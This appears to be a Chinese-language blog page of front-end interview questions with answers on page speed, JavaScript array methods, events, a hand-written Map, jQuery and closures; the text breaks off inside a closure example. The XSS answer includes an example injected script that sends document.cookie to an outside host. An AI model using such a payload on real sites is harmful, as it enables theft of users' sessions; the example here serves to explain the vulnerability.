+<h2 id="业界常用的优化-WEB-页面加载速度的方法（可以分别从页面元素展现，请求连接，css-js-服务器等方面介绍）"><a href="#业界常用的优化-WEB-页面加载速度的方法（可以分别从页面元素展现，请求连接，css-js-服务器等方面介绍）" class="headerlink" title="业界常用的优化 WEB 页面加载速度的方法（可以分别从页面元素展现，请求连接，css,js,服务器等方面介绍）"></a>业界常用的优化 WEB 页面加载速度的方法（可以分别从页面元素展现，请求连接，css,js,服务器等方面介绍）</h2><p>1) 优化图像，使用 CSS Sprites 整合图像<br>2) 去掉不必要的插件<br>3) 减少DNS查询(DNS lookups)<br>4) 最小化重定向，重定向增加了额外的HTTP请求<br>5) 使用内容分发网络（Content Delivery Network CDN）<br>6) 把CSS文件放在页面顶部，而JS文件放在底部<br>7) 利用浏览器缓存<br>8) 压缩CSS和JavaScript<br>9) 启用GZIP压缩</p>
+<blockquote>
+<p>使用良好的结构;<br>不要使布局超载;<br>不要使用图像来表示文本，图像进行导航不利于 SEO;<br>检查 cookie 使用情况;<br>尽可能避免使用表格;<br>删除任何不必要的元素;<br>一些优化网页的技巧;<br>压缩和缩小 JavaScript 文件;<br>设置图像大小;<br>将 CSS 图像映射用于装饰功能;<br>尽可能延迟脚本加载;<br>按需加载 JavaScript 文件;<br>优化 CSS 文件;<br>使用内容分布网络;<br>对资产使用多个域来增加连接;<br>在合适的时候使用 Google Gears;<br>使用 PNG 格式的图像;<br>保持 Ajax 调用简短、准确;<br>进行一次较大的 Ajax 调用并在本地处理客户机数据;<br>在沙箱中测试代码;<br>分析站点代码;<br>使用 JSLint 检查 JavaScript 代码中的错误或糟糕的编码实践;<br>检查孤立的文件和丢失的图像 ;<br>YSlow 扩展：使用 YSlow 分析网页;</p>
+</blockquote>
+<p><a href="http://www.cnblogs.com/xp796/p/5236945.html" target="_blank" rel="noopener">25种提高网页加载速度的方法和技巧</a></p>
+<h2 id="列举常用的-web-页面开发，调试以及优化工具"><a href="#列举常用的-web-页面开发，调试以及优化工具" class="headerlink" title="列举常用的 web 页面开发，调试以及优化工具"></a>列举常用的 web 页面开发，调试以及优化工具</h2><p>开发工具：PS、FireWorks、WebStrom、SubLime Text、Eclipse、Aptana、DreamWeaver、NotePad++、Yslow<br>调试工具：谷歌浏览器、火狐 FireBug、IETester、HTTPWatch Stadio<br>优化工具：gulp、grunt、webpack<br>使用率较高的框架有 jQuery、YUI、Prototype、Dojo、Ext.js、Mootools等。尤其是jQuery，超过91%。<br>轻量级框架有 Modernizr、underscore.js、backbone.js、Raphael.js等。</p>
+<h2 id="解释什么是sql注入，xss漏洞"><a href="#解释什么是sql注入，xss漏洞" class="headerlink" title="解释什么是sql注入，xss漏洞"></a>解释什么是sql注入，xss漏洞</h2><p>所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。<br>在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。</p>
+<p>XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。<br>它指的是恶意攻击者往Web页面里插入恶意脚本代码，而程序对于用户输入内容未过滤；当用户浏览该页之时，嵌入其中Web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。<br>1)恶意用户，在一些公共区域（例如，建议提交表单或消息公共板的输入表单）输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是他们要输入的文本，同时还包括一些可以在客户端执行的脚本。<br>如：<code>http://xxx.xxx.com.cn/intf/_photos.jsp?callback=&lt;script&gt;window.location.href=&quot;http://www.baidu.com?a=&quot; + escape(document.cookie)&lt;/script&gt;、参数&lt;script&gt;xxx&lt;/script&gt;</code>如果这里没有经过转义处理，则页面中就嵌入了一段script。<br>2)恶意提交这个表单<br>3)其他用户看到这个包括恶意脚本的页面并执行，获取用户的cookie等敏感信息。</p>
+<h2 id="请列举js数组类型中的常用方法"><a href="#请列举js数组类型中的常用方法" class="headerlink" title="请列举js数组类型中的常用方法"></a>请列举js数组类型中的常用方法</h2><ul>
+<li>push();<ul>
+<li>尾部追加一个或多个元素，push 一个元素与给数组 a[a.length] 赋值一样；</li>
+<li>返回新数组长度</li>
+<li>操作原数组，末尾追加</li>
+</ul>
+</li>
+<li>pop();<ul>
+<li>删除数组中最后一个元素，</li>
+<li>返回值是被删除的这个元素</li>
+<li>操作原数组</li>
+</ul>
+</li>
+<li>shift();<ul>
+<li>删除数组中的第一个元素，</li>
+<li>返回值是被删除的元素</li>
+</ul>
+</li>
+<li>unshift();<ul>
+<li>向数组中第一个元素之前插入一个或多个新的元素</li>
+<li>返回值是新数组的长度</li>
+</ul>
+</li>
+<li>concat(); Array.concat() 方法创建并返回新数组<ul>
+<li>新的数组和旧的数组拼接，产生一个新的数组</li>
+<li>不修改原数组</li>
+</ul>
+</li>
+<li>slice(); Array.slice()方法返回指定数组的一个片段或子数组<ul>
+<li>两个参数： 开始索引，结束索引，返回包含开始索引，不包含结束索引位置之间的所有数组元素；</li>
+<li>指定一个参数，返回包含开始位置到数组结尾的所有元素</li>
+<li>参数是负数，相对于最后一个位置的。如参数 -1 指定了最后一个元素，-2 是倒数第二个</li>
+<li>从原来的数组中截取出来指定的一部分元素，产生新的数组</li>
+<li>不操作原数组</li>
+</ul>
+</li>
+<li>splice(); Array.splice()是数组中插入或删除元素的方法。<ul>
+<li>会修改调用数组，</li>
+<li>第一个参数是开始的下标,第二个参数是指定了删除原数组元素的个数；</li>
+<li>如果省略了第二个参数，从开始索引位置后的元素都被删除；</li>
+<li>可以有第三个参数，第四个参数…跟在第二个参数后的任意多个参数是需要插入原数组中的元素，从第一个参数指定的索引位置插入；</li>
+<li>该方法返回的是删除元素组成的数组,如果没有替换则返回空数组。</li>
+</ul>
+</li>
+<li>join(); 将数组中的所有元素都转化成字符串并连接到一起<ul>
+<li>返回最终生成的字符串</li>
+<li>是 String.split() 方法的逆向操作。String.split() 是将字符串分隔成分隔，返回数组；</li>
+</ul>
+</li>
+<li>reverse();<ul>
+<li>反转数组</li>
+<li>操作原数组</li>
+<li>返回操作后的逆向数组</li>
+</ul>
+</li>
+<li>sort(); Array.sort() 方法将数组中的元素排序并返回排序后的数组<ul>
+<li>操作原数组；</li>
+<li>返回排序后的数组</li>
+</ul>
+</li>
+<li>toString()<ul>
+<li>和不使用任何参数调用 join() 方法返回的字符串是一样的。</li>
+</ul>
+</li>
+<li>toLocalString() 方法是 toString() 方法的本地化版本，使用本地    化分隔符将这些字符串连接起来生成最终字符串。</li>
+<li>indexOf()和lastIndexOf(); 搜索整个数组中具有给定值的元素<ul>
+<li>查找某个元素，</li>
+<li>第一个参数是要查找的元素,</li>
+<li>第二个参数是开始查找的下标,</li>
+<li>找到则返回找到的第一个元素的索引，找不到则返回-1</li>
+</ul>
+</li>
+<li>lastIndexOf();<ul>
+<li>这个方法也是查找元素,从后面向前面找,找到则返回对应的下标,找不到则返回-1；</li>
+<li>第二个元素可以是负数，代表相对数组末尾的偏移量；</li>
+</ul>
+</li>
+<li>every() 和 some(); 数组的逻辑判定，传入一个函数,判断每个数组中的元素是否满足条件；<ul>
+<li>every() 方法针对所有的元素判断调用函数返回全为 true，则返回true；</li>
+<li>every() 方法有一个不满足条件的则返回 false</li>
+<li>some() 方法所有的元素判断调用函数有一个满足条件的则返回 true</li>
+<li>some() 方法全为 false, 则返回 false</li>
+</ul>
+</li>
+<li>map() 方法，将调用的数组的每个元素传递给指定的函数，并返回一个  包含该函数的数组。<ul>
+<li>返回新数组</li>
+<li>不修改原数组</li>
+<li>稀疏数组调用返回的还是稀疏数组<ul>
+<li>一个例子：arr.map(Math.sqrt);<ul>
+<li>map这个方法可以传入一个回调函数,</li>
+<li>直接传入了一个Math.sqrt方法,sqrt方法是为某个数字开平方的</li>
+<li>调用map方法传入Math.sqrt的时候,去掉了括号,也没有传入参数</li>
+<li>map方法内部帮我们遍历并且传入数组的每个元素</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>filter() 方法，返回的是调用的数组的一个子集，传递的回调函数用来逻辑判断，该函数的返回值是布尔值；<ul>
+<li>压缩空缺或并删除 undefined 和 null 元素，也可以使用 filter();</li>
+</ul>
+</li>
+<li>instanceof</li>
+<li>isArray(); ECMAScript 5 中给出的检测数组类型的方法；<ul>
+<li>这个方法是判断变量是不是数组</li>
+</ul>
+</li>
+<li>forEach 方法，从头至尾遍历数组，为每个元素调用指定的函数；<ul>
+<li>三个参数，数值元素、数组索引、数组本身</li>
+<li>无法再所有元素传递完调用函数之前终止遍历</li>
+</ul>
+</li>
+<li>reduce()和 reduceRight()<ul>
+<li>reduce() 和 reduceRight() 方法使用指定的函数将数组元素进行组合，生成单个值。</li>
+<li>reduce() 两个参数：<ul>
+<li>第一个是执行简化操作的函数。化简函数的任务就是用某种方法把两个值组合和化简为一个值，并返回简化后的值。</li>
+<li>第二个参数是可选参数</li>
+</ul>
+</li>
+<li>reduceRight() 的工作原理和 reduce() 一样，不同的是它按照数组索引从高到低处理数组；</li>
+</ul>
+</li>
+</ul>
+<h2 id="ECMAScript-6-中数组新方法"><a href="#ECMAScript-6-中数组新方法" class="headerlink" title="ECMAScript 6 中数组新方法"></a>ECMAScript 6 中数组新方法</h2><ul>
+<li>Array.prototype.find 方法用于找出第一个符合条件的数组成员。<ul>
+<li>参数是一个回调函数，找到第一个返回 true 的数组项，然后返回该数组项；</li>
+<li>找不到返回undefined；</li>
+</ul>
+</li>
+<li>两个静态方法<ul>
+<li>Array.from<ul>
+<li>将一个伪数组转成正真的数组</li>
+</ul>
+</li>
+<li>Array.of<ul>
+<li>将方法中参数都添加到一个数组中</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>操作、填充和过滤数组的方法<ul>
+<li>Array.prototype.copyWidthin</li>
+<li>Array.prototype.fill</li>
+<li>Array.prototype.find<ul>
+<li>接收一个回调函数，每一项执行调用它</li>
+</ul>
+</li>
+<li>Array.prototype.findIndex</li>
+</ul>
+</li>
+<li>有关数组迭代的方法<ul>
+<li>Array.prototype.keys</li>
+<li>Array.prototype.values</li>
+<li>Array.prototype.entries</li>
+<li>Array.prototype[Symbol.iterator]</li>
+</ul>
+</li>
+</ul>
+<h2 id="FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素"><a href="#FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素" class="headerlink" title="FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素"></a>FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stopPropagation</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">  e = e || <span class="built_in">window</span>.event;  </span><br><span class="line">  <span class="keyword">if</span>(e.stopPropagation) &#123; <span class="comment">//W3C阻止冒泡方法  </span></span><br><span class="line">    e.stopPropagation();  </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    e.cancelBubble = <span class="literal">true</span>; <span class="comment">//IE阻止冒泡方法  </span></span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'need_hide'</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">  stopPropagation(e);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="列举常用的js框架以及分别适用的领域"><a href="#列举常用的js框架以及分别适用的领域" class="headerlink" title="列举常用的js框架以及分别适用的领域"></a>列举常用的js框架以及分别适用的领域</h2><p>jQuery 库 DOM 操作<br>Bootstrap 是 UI 组件，响应式布局<br>Angular 框架单页应用程序 SPA</p>
+<p>库的特点</p>
+<ul>
+<li>选择器（Selector）</li>
+<li>DOM 遍历</li>
+<li>DOM 操作</li>
+<li>实用（Utility）函数</li>
+<li>事件处理</li>
+<li>Ajax</li>
+</ul>
+<h2 id="js中如何实现一个map"><a href="#js中如何实现一个map" class="headerlink" title="js中如何实现一个map"></a>js中如何实现一个map</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html &gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;无标题文档&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;script language="javascript"&gt;</span></span><br><span class="line"><span class="regexp">  Array.prototype.remove = function(s) &#123;</span></span><br><span class="line"><span class="regexp">    for (var i = 0; i &lt; this.length; i++) &#123;</span></span><br><span class="line"><span class="regexp">      if (s == this[i]) this.splice(i, 1);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  function Map() &#123;</span></span><br><span class="line"><span class="regexp">    /</span>** 存放键的数组(遍历用到) *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    this.keys = new Array();</span></span><br><span class="line"><span class="regexp">    /</span>** 存放数据 *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    this.data = new Object();</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 放入一个键值对</span></span><br><span class="line"><span class="regexp">    this.put = function(key, value) &#123;</span></span><br><span class="line"><span class="regexp">      if(this.data[key] == null)&#123;</span></span><br><span class="line"><span class="regexp">        this.keys.push(key);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      this.data[key] = value;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取某键对应的值</span></span><br><span class="line"><span class="regexp">    this.get = function(key) &#123;</span></span><br><span class="line"><span class="regexp">      return this.data[key];</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 删除一个键值对</span></span><br><span class="line"><span class="regexp">    this.remove = function(key) &#123;</span></span><br><span class="line"><span class="regexp">      this.keys.remove(key);</span></span><br><span class="line"><span class="regexp">      this.data[key] = null;</span></span><br><span class="line"><span class="regexp">    &#125;; </span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 遍历Map,执行处理函数</span></span><br><span class="line"><span class="regexp">    this.each = function(fn)&#123;</span></span><br><span class="line"><span class="regexp">      if(typeof fn != 'function')&#123;</span></span><br><span class="line"><span class="regexp">          return;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      var len = this.keys.length;</span></span><br><span class="line"><span class="regexp">      for(var i=0;i&lt;len;i++)&#123;</span></span><br><span class="line"><span class="regexp">        var k = this.keys[i];</span></span><br><span class="line"><span class="regexp">        fn(k,this.data[k],i);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取键值数组(类似Java的entrySet())</span></span><br><span class="line"><span class="regexp">    this.entrys = function() &#123;</span></span><br><span class="line"><span class="regexp">      var len = this.keys.length;</span></span><br><span class="line"><span class="regexp">      var entrys = new Array(len);</span></span><br><span class="line"><span class="regexp">      for (var i = 0; i &lt; len; i++) &#123;</span></span><br><span class="line"><span class="regexp">        entrys[i] = &#123;</span></span><br><span class="line"><span class="regexp">          key : this.keys[i],</span></span><br><span class="line"><span class="regexp">          value : this.data[i]</span></span><br><span class="line"><span class="regexp">        &#125;;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      return entrys;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 判断Map是否为空</span></span><br><span class="line"><span class="regexp">    this.isEmpty = function() &#123;</span></span><br><span class="line"><span class="regexp">        return this.keys.length == 0;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取键值对数量</span></span><br><span class="line"><span class="regexp">    this.size = function()&#123;</span></span><br><span class="line"><span class="regexp">      return this.keys.length;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 重写toString </span></span><br><span class="line"><span class="regexp">    this.toString = function()&#123;</span></span><br><span class="line"><span class="regexp">      var s = "&#123;";</span></span><br><span class="line"><span class="regexp">      for(var i=0;i&lt;this.keys.length;i++,s+=',')&#123;</span></span><br><span class="line"><span class="regexp">        var k = this.keys[i];</span></span><br><span class="line"><span class="regexp">        s += k+"="+this.data[k];</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      s+="&#125;";</span></span><br><span class="line"><span class="regexp">      return s;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  function testMap()&#123;</span></span><br><span class="line"><span class="regexp">    var m = new Map();</span></span><br><span class="line"><span class="regexp">    m.put('key1','Comtop');</span></span><br><span class="line"><span class="regexp">    m.put('key2','南方电网');</span></span><br><span class="line"><span class="regexp">    m.put('key3','景新花园');</span></span><br><span class="line"><span class="regexp">    alert("init:"+m);  </span></span><br><span class="line"><span class="regexp">    m.put('key1','康拓普');</span></span><br><span class="line"><span class="regexp">    alert("set key1:"+m);</span></span><br><span class="line"><span class="regexp">    m.remove("key2");</span></span><br><span class="line"><span class="regexp">    alert("remove key2: "+m);</span></span><br><span class="line"><span class="regexp">    var s ="";</span></span><br><span class="line"><span class="regexp">    m.each(function(key,value,index)&#123;</span></span><br><span class="line"><span class="regexp">        s += index+":"+ key+"="+value+"\n";</span></span><br><span class="line"><span class="regexp">    &#125;);</span></span><br><span class="line"><span class="regexp">    alert(s);</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">  &lt;body onload="testMap()"&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/angel_he/article/details/47613743" target="_blank" rel="noopener">用js写一个实现map</a></p>
+<h2 id="js可否实现面向对象编程，如果可以如何实现js对象的继承"><a href="#js可否实现面向对象编程，如果可以如何实现js对象的继承" class="headerlink" title="js可否实现面向对象编程，如果可以如何实现js对象的继承"></a>js可否实现面向对象编程，如果可以如何实现js对象的继承</h2><blockquote>
+<p>扩展原型对象实现继承<br>替换原型对象实现继承<br>另一种原型继承（动态原型模式） 特点：让代码封装到一起<br>混入继承： 已知两个对象，一个对象继承另一个对象的功能，for..in, jQuery的extend()方法原理是混入继承<br>原型+混入继承：混入继承的应用, 在一个对象的原型对象上扩展另一个对象的属性和方法, jQuery.fn.extend() 利用的原理是原型+混入继承<br>经典继承：已知一个对象knownObj，需要创建一个新对象，这个新对象继承自已知的对象knownObj,ES5 Object.create()方法的实现原理就是经典继承<br>借用构造函数实现继承<br>混合继承（经典继承+借用构造函数） 解决借用构造函数继承不能够继承原型对象上的方法的问题; 继承了两次构造函数（模板）<br>混合继承（经典继承+借用构造函数）</p>
+</blockquote>
+<h2 id="变量的命名规范以及命名推荐"><a href="#变量的命名规范以及命名推荐" class="headerlink" title="变量的命名规范以及命名推荐"></a>变量的命名规范以及命名推荐</h2><blockquote>
+<p>变量，函数，方法：小写开头，以后的每个单词首字母大写 （驼峰）<br>构造函数，class：每个单词大写开头<br>基于实际情况，以动词，名词，谓词来命名。尽量言简意骇，以命名代替注释</p>
+</blockquote>
+<h2 id="三种弹窗的单词以及三种弹窗的功能"><a href="#三种弹窗的单词以及三种弹窗的功能" class="headerlink" title="三种弹窗的单词以及三种弹窗的功能"></a>三种弹窗的单词以及三种弹窗的功能</h2><p>1) alert</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//弹出对话框并输出一段提示信息  </span><br><span class="line">  function ale() &#123;  </span><br><span class="line">    //弹出一个对话框  </span><br><span class="line">    alert(&quot;提示信息！&quot;);  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>2) confirm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//弹出一个询问框，有确定和取消按钮  </span><br><span class="line">function firm() &#123;  </span><br><span class="line">  //利用对话框返回的值 （true 或者 false）  </span><br><span class="line">  if (confirm(&quot;你确定提交吗？&quot;)) &#123;  </span><br><span class="line">    alert(&quot;点击了确定&quot;);  </span><br><span class="line">  &#125;  </span><br><span class="line">  else &#123;  </span><br><span class="line">    alert(&quot;点击了取消&quot;);  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>3) prompt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//弹出一个输入框，输入一段文字，可以提交  </span><br><span class="line">function prom() &#123;  </span><br><span class="line">  var name = prompt(&quot;请输入您的名字&quot;, &quot;&quot;); //将输入的内容赋给变量 name ，  </span><br><span class="line">  //这里需要注意的是，prompt有两个参数，前面是提示的话，后面是当对话框出来后，在对话框里的默认值  </span><br><span class="line">  if (name)//如果返回的有内容  </span><br><span class="line">  &#123;  </span><br><span class="line">    alert(&quot;欢迎您：&quot; + name)  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="输出值是"><a href="#输出值是" class="headerlink" title="输出值是"></a>输出值是</h2><blockquote>
+<p>console.log( 8 | 1 ); // 9</p>
+</blockquote>
+<h2 id="求一个函数-y-f-x-a-b"><a href="#求一个函数-y-f-x-a-b" class="headerlink" title="求一个函数 y = f(x, a, b);"></a>求一个函数 y = f(x, a, b);</h2><p>只允许使用 + - / 和 Math.，当x &gt; 100 时返回 a 的值，否则返回 b 的值，不能使用 if else 等条件语句，也不能使用 |, ? :, 数组。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function f(x, a, b) &#123;</span><br><span class="line">  var temp = Math.ceil(Math.min(Math.max(x - 100, 0), 1));</span><br><span class="line">  return a * temp + b * (1 - temp);</span><br><span class="line">&#125;</span><br><span class="line">console.log(f(-10, 1, 2));</span><br></pre></td></tr></table></figure>
+<h2 id="JavaScript-alert-0-4-0-2-结果是多少-如何处理"><a href="#JavaScript-alert-0-4-0-2-结果是多少-如何处理" class="headerlink" title="JavaScript alert(0.4*0.2); 结果是多少? 如何处理"></a>JavaScript alert(0.4*0.2); 结果是多少? 如何处理</h2><blockquote>
+<p>有误差，应该比准确结果偏大。<br>一般我会将小数变为整数来处理。<br>当前之前遇到这个问题时也上网查询发现有人用try catch return写了一个函数，<br>当然原理也是一致先转为整数再计算。</p>
+</blockquote>
+<h2 id="一个div，有几种方式得到这个-div-的-jQuery-对象？"><a href="#一个div，有几种方式得到这个-div-的-jQuery-对象？" class="headerlink" title="一个div，有几种方式得到这个 div 的 jQuery 对象？"></a>一个div，有几种方式得到这个 div 的 jQuery 对象？</h2><p><code>&lt;div class=&#39;aabbcc&#39; id=&#39;nodesView&#39;&gt;&lt;/div&gt;</code></p>
+<p>想直接获取这个div的dom对象，如何获取？dom对象如何转化为jQuery对象？</p>
+<blockquote>
+<p>$(“#nodesView”)<br>$(“.aabbcc”)<br>$(“#nodesView”)[0]<br>$(“.aabbcc”)[0]</p>
+</blockquote>
+<h2 id="jQuery-框架中-ajax-的常用参数有哪些"><a href="#jQuery-框架中-ajax-的常用参数有哪些" class="headerlink" title="jQuery 框架中 $.ajax()的常用参数有哪些"></a>jQuery 框架中 $.ajax()的常用参数有哪些</h2><p>写一个post请求并带有发送数据和返回数据的样例</p>
+<blockquote>
+<p>async是否异步<br>url请求地址<br>contentType发送信息至服务器时内容编码类型<br>data发送到服务器的数据<br>dataType预期服务器返回的数据类型<br>type请求类型<br>success请求成功回调函数<br>error请求失败回调函数</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">  url: &quot;/jquery/test1.txt&quot;,</span><br><span class="line">  type: &apos;post&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">      id: 1</span><br><span class="line">  &#125;,</span><br><span class="line">  success: function(data) &#123;</span><br><span class="line">    alert(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>下面这个ul，如何点击每一列的时候 alert 其 index</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=&quot;test&quot;&gt;</span><br><span class="line">  &lt;li&gt;这是第一条&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;这是第二条&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;这是第三条&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.onload = function() &#123;</span><br><span class="line">    var lis = document.getElementById(&apos;test&apos;).children;</span><br><span class="line">    for (var i = 0; i &lt; lis.length; i++) &#123;</span><br><span class="line">      lis[i].onclick = (function(i) &#123;</span><br><span class="line">        return function() &#123;</span><br><span 